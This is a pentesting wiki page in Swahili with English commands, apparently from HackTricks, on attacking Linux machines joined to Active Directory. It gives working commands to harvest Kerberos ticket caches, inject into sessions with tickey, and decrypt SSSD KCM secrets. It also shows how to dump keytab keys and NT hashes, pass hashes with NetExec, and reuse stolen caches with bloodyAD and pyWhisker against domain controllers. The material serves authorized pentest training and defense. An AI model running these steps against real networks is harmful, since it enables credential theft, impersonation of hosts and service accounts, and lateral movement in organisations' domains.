# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Mashine ya Linux pia inaweza kuwepo ndani ya mazingira ya Active Directory.

Mashine ya Linux iliyo ndani ya AD inaweza **kuhifadhi Kerberos material ndani ya mashine**: user ccaches, machine/service keytabs, na secrets zinazosimamiwa na SSSD. Artefacts hizi kwa kawaida zinaweza kutumiwa tena kama Kerberos credential nyingine yoyote. Ili kusoma nyingi kati yake, utahitaji kuwa user owner wa ticket au **root** kwenye mashine.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeration

### AD enumeration kutoka linux

Ikiwa una access kwenye AD kutoka linux (au bash kwenye Windows), unaweza kujaribu [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) kufanya enumeration ya AD.

Unaweza pia kuangalia ukurasa ufuatao ili kujifunza **njia nyingine za kufanya enumeration ya AD kutoka linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA ni **alternative** ya Microsoft Windows **Active Directory** yenye open-source, hasa kwa mazingira ya **Unix**. Inachanganya **LDAP directory** kamili na MIT **Kerberos** Key Distribution Center kwa usimamizi unaofanana na Active Directory. Kwa kutumia Dogtag **Certificate System** kwa usimamizi wa certificate za CA & RA, inaunga mkono authentication ya **multi-factor**, ikiwemo smartcards. SSSD imeunganishwa kwa michakato ya authentication ya Unix.<sup>[[14]](#references)[[15]](#references)</sup> Jifunze zaidi kuihusu kwenye:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefacts za host iliyojiunga na domain

Kabla ya kushughulikia tickets, tambua **jinsi host ilivyojiunga na AD** na **mahali Kerberos material imehifadhiwa kwa kweli**. Kwenye hosts za kisasa za Linux, hili kwa kawaida hushughulikiwa na `realmd` + `adcli` + `sssd`, si files tambarare pekee ndani ya `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Hii inakuambia kwa haraka ikiwa host inaamini AD, ikiwa SSSD inahifadhi identities au tickets kwenye cache, na ikiwa **machine/service keytabs** au **KCM secrets** zinapatikana kwa matumizi mabaya.<sup>[[4]](#references)[[10]](#references)</sup>

## Kucheza na tickets

### Pass The Ticket

Katika ukurasa huu utapata maeneo tofauti ambapo unaweza **kupata kerberos tickets ndani ya linux host**, na katika ukurasa ufuatao unaweza kujifunza jinsi ya kubadilisha fomati hizi za CCache tickets kuwa Kirbi (fomati unayohitaji kutumia katika Windows) na pia jinsi ya kutekeleza shambulio la PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Ikiwa unataka **michakato ya Linux-specific ticket harvesting** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, n.k.), angalia ukurasa maalum:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Kutumia tena CCACHE tickets kutoka /tmp

CCACHE files ni binary formats za **kuhifadhi Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` bado hutumiwa kwa kawaida, lakini deployments za kisasa za Linux pia hutumia `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, au `KCM:%{uid}`. Kagua environment variable ya **`KRB5CCNAME`** na setting ya `default_ccache_name` kabla ya kudhani kuwa tickets ziko kwenye `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**Kerberos tickets zilizohifadhiwa kwenye memory ya process zinaweza kutolewa**, hasa wakati ptrace protection ya mashine imezimwa (`/proc/sys/kernel/yama/ptrace_scope`). Tool muhimu kwa ajili hii inapatikana kwenye [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), ambayo hurahisisha extraction kwa ku-inject kwenye sessions na kudump tickets kwenye `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Ili ku-configure na kutumia tool hii, hatua zifuatazo hufuatwa:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Utaratibu huu utajaribu kuingiza kwenye sessions mbalimbali, na kuonyesha mafanikio kwa kuhifadhi tickets zilizotolewa kwenye `/tmp` kwa mpangilio wa majina wa `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Matumizi tena ya CCACHE ticket kutoka SSSD KCM

SSSD huhifadhi nakala ya database kwenye njia `/var/lib/sss/secrets/secrets.ldb`. Key inayolingana huhifadhiwa kama faili iliyofichwa kwenye njia `/var/lib/sss/secrets/.secrets.mkey`. Kwa chaguo-msingi, key hiyo inaweza kusomeka tu ikiwa una ruhusa za **root**.<sup>[[4]](#references)</sup>

Kuita **`SSSDKCMExtractor`** kwa kutumia vigezo vya --database na --key kutachanganua database na **kufungua siri kwa decryption**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Extractor huchapisha payload za Kerberos JSON ghafi; zibadilishe kuwa ticket cache inayoweza kutumika au format nyingine ya ticket kabla ya operesheni za pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Uchunguzi wa haraka wa keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Toa akaunti kutoka /etc/krb5.keytab

Funguo za akaunti za huduma, ambazo ni muhimu kwa huduma zinazoendesha zikiwa na ruhusa za root, huhifadhiwa kwa usalama katika faili za **`/etc/krb5.keytab`**. Funguo hizi, zinazofanana na passwords za huduma, zinahitaji usiri mkali.<sup>[[5]](#references)</sup>

Ili kukagua yaliyomo kwenye faili ya keytab, **`klist`** inaweza kutumika. Kwenye Linux, `klist -k -K -e` huonyesha principals, nambari za matoleo ya funguo, aina za encryption, na key material ghafi. Ikiwa aina ya key ni **23 / RC4-HMAC**, thamani ya key pia ni **NT hash** ya principal huyo.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Kwa watumiaji wa Linux, **`KeyTabExtract`** hutoa utendaji wa kutoa RC4 HMAC hash, ambayo inaweza kutumika tena kwa NTLM hash. Kumbuka kwamba hii husaidia tu wakati keytab bado ina nyenzo za **etype 23 / RC4-HMAC**. Katika mazingira ya **AES-only**, huenda usipate NT hash inayoweza kutumika tena, lakini bado unaweza kufanya authentication moja kwa moja kwa kutumia keytab kupitia Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Kwenye macOS, **`bifrost`** hutumika kama zana ya uchanganuzi wa faili za keytab.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Kwa kutumia maelezo ya akaunti na hash yaliyotolewa, miunganisho kwenye servers inaweza kuanzishwa kwa kutumia tools kama **`NetExec`**.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Tumia tena machine account kutoka `/etc/krb5.keytab`

Kwenye mifumo iliyojiunga kwa `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` kwa kawaida huwa na **computer account** na **host/service principals** mmoja au zaidi. Ikiwa una **root**, usiifanye dump tu: tumia mojawapo ya principals zilizoorodheshwa na `klist -k` kuomba TGT na kufanya kazi kama Linux host yenyewe.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Hii ni muhimu hasa wakati **computer object** yenyewe ina haki zilizokabidhiwa katika AD au wakati host inaruhusiwa kupata secrets nyingine kama **gMSA**.<sup>[[13]](#references)</sup>

### Tumia tena nyenzo za Kerberos zilizoibwa kwa kutumia AD tooling inayotanguliza Linux

Baada ya kuwa na `ccache` halali au keytab inayoweza kutumika, unaweza kufanya kazi dhidi ya AD **moja kwa moja kutoka Linux** bila kugeuza kila kitu kwanza kuwa Windows formats. Zana nyingi za kisasa zinakubali `KRB5CCNAME` / Kerberos auth natively.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Huu ni muunganiko mzuri kati ya **Linux post-exploitation** na **AD object abuse**. Kwa njia zenyewe za object-level abuse, angalia:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Linux deployments za hivi karibuni zinaweza kutumia **Managed Service Accounts** moja kwa moja kutoka AD. Kwa vitendo, hii inamaanisha kwamba baada ya ku-compromise Linux server, huenda ukapata si host keytab pekee bali pia **service-specific keytabs** zilizozalishwa kutoka kwa gMSA. Maeneo ya kawaida ya kukagua ni `/etc/gmsad.conf`, config files maalum za deployment, na faili za ziada za `*.keytab` zilizo chini ya `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Hii hukupa utambulisho wa Kerberos unaoweza kutumika tena kwa SPNs zilizofungamanishwa na gMSA hiyo **bila kugusa endpoint yoyote ya Windows**.<sup>[[13]](#references)</sup> Kwa matumizi mabaya ya gMSA/dMSA **upande wa domain** baada ya kupata privileges za juu katika AD, angalia:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Jinsi ya kushambulia Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kufikia AD kwa kutumia managed service account – Kuunganisha mifumo ya RHEL moja kwa moja na Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Vigezo vya mazingira vya Kerberos – Nyaraka za MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Nyaraka za MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Aina za usimbaji fiche za RC4-HMAC Kerberos zinazotumiwa na Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kutumia Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Kugundua na Kujiunga na Identity Domains | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Mwongozo wa Mtumiaji wa bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Kuhusu | Nyaraka za FreeIPA](https://www.freeipa.org/About.html)
- [15] [Maelezo ya toleo la FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Nyaraka za Linux Kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Nyaraka za MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
